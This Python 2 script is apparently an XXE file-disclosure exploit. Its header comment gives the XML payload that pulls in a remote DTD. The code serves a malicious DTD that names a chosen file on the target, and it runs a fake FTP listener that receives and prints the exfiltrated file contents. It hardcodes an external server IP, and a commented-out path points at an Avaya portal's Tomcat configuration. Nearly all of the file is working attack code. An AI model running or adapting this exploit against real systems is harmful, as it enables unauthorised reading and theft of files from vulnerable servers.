#
#
# This XXE/HTTP server is assuming the following XXE payload 
#
#   <?xml version="1.0" encoding="utf-8"?>
#   <!DOCTYPE test [  
#       <!ENTITY % a SYSTEM "http://<IP Address>/f.dtd" >
#       %a;
#       %c;
#   ]>
#
#   <someEntry>%rrr;</someEntry>
#
#

import time
import BaseHTTPServer
import socket
from threading import Thread
import sys
import argparse


HOST_NAME = '0.0.0.0'
SERVER_IP = '54.198.132.32'
DTD_PORT_NUMBER = 80
FTP_PORT_NUMBER = 8000
shutdown = False
file_path = None

def stop_ftp_serv():   

    global shutdown
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect( (HOST_NAME, FTP_PORT_NUMBER))
        s.close()
    except:
        pass

    shutdown = True

def handle_connection(conn):

    global shutdown

    file_recv = False
    file_data = ""
    while 1:

        if file_recv == False:
            conn.send("200\n")

        try:
            data = conn.recv(1024)
            if "RETR" in data:
                data = data.replace("RETR ", "")
                file_recv = True
        except:
            #print("[+] Socket Timeout")
            if file_recv:
                conn.send("exit\r\nexit\r\n")
                try:
                    conn.recv(1024)
                except:
                    pass
                break
            pass

        if file_recv:
           file_data += data

        # Check shutdown flag
        if shutdown: 
            break


    print(file_data)
    conn.close()


def emulate_ftp():
    
    print("[+] %s - FTP Server Starts - %s:%s" % (time.asctime(), HOST_NAME, FTP_PORT_NUMBER))
    ftp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ftp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ftp_sock.bind((HOST_NAME, FTP_PORT_NUMBER))
    ftp_sock.listen(1)

    conn, addr = ftp_sock.accept()
    conn.settimeout(2)
    print("[+] Connection initiated by %s" % addr[0])
    handle_connection(conn)

    print("[+] %s - FTP Server Stops - %s:%s" % (time.asctime(), HOST_NAME, FTP_PORT_NUMBER))
    return


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):

        global file_path

        """Respond to a GET request."""
        s.send_response(200)
        s.send_header("Content-type", "application/octet-stream")
        s.end_headers()
        
        #file_path = "c:/progra~2/Avaya/onexportal/Tomcat/Server/conf"
        file_line = '<!ENTITY %% content SYSTEM "file:///%s">\n' % file_path
        s.wfile.write(file_line)
        file_line = '<!ENTITY %% c "<!ENTITY rrr SYSTEM \'ftp://%s:%d/%%content;\'>">\n' % (SERVER_IP,FTP_PORT_NUMBER)
        s.wfile.write(file_line)
  

if __name__ == '__main__':

    # Setup arguments
    parser = argparse.ArgumentParser(description='XXE file disclosure via FTP.')
    parser.add_argument('-f', dest='file_path', help='Path to file or directory on target system.', required=True)

    # Parse out arguments
    args = parser.parse_args()
    file_path = args.file_path
    file_path = file_path.replace("\\", "/")

    ftp_thread = Thread(target=emulate_ftp, args=([]))
    ftp_thread.start()
    # Sleep to let the FTP server start up
    time.sleep(2)

    server_class = BaseHTTPServer.HTTPServer
    try:
        httpd = server_class((HOST_NAME, DTD_PORT_NUMBER), MyHandler)
        print("[+] %s - DTD Server Starts - %s:%s" % (time.asctime(), HOST_NAME, DTD_PORT_NUMBER))
        httpd.serve_forever()
    except (KeyboardInterrupt, Exception) as err:
        pass

    print("[+] Shutting down servers.")
    stop_ftp_serv()
    httpd.server_close()
    print("[+] %s - DTD Server Stops - %s:%s" % (time.asctime(), HOST_NAME, DTD_PORT_NUMBER))

    
